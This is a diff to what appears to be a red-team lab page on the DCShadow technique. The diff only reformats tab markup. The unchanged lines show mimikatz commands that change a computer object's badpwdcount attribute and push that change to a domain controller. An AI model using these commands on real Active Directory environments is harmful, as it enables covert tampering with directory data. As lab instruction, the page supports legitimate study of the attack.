@@ -18,23 +18,23 @@ PS c:\> ([adsisearcher]"(&(objectCategory=Computer)(name=pc-w10))").Findall().Pr
 
 Note the `badpwcount` property which we will try to change with DCShadow by setting the value to 9999:
 
-{% code-tabs %}
-{% code-tabs-item title="mimikatz@NT/SYSTEM console" %}
+{% tabs %}
+{% tab title="mimikatz@NT/SYSTEM console" %}
 ```csharp
 mimikatz # lsadump::dcshadow /object:pc-w10$ /attribute:badpwdcount /value=9999
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 We can now push the change to the primary Domain Controller `DC-MANTVYDAS`:
 
-{% code-tabs %}
-{% code-tabs-item title="mimikatz@Domain Admin console" %}
+{% tabs %}
+{% tab title="mimikatz@Domain Admin console" %}
 ```csharp
 lsadump::dcshadow /push
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Below are the screenshots of the above commands and their outputs as well as the end result, indicating the `badpwcount`value getting changed to 9999:
 
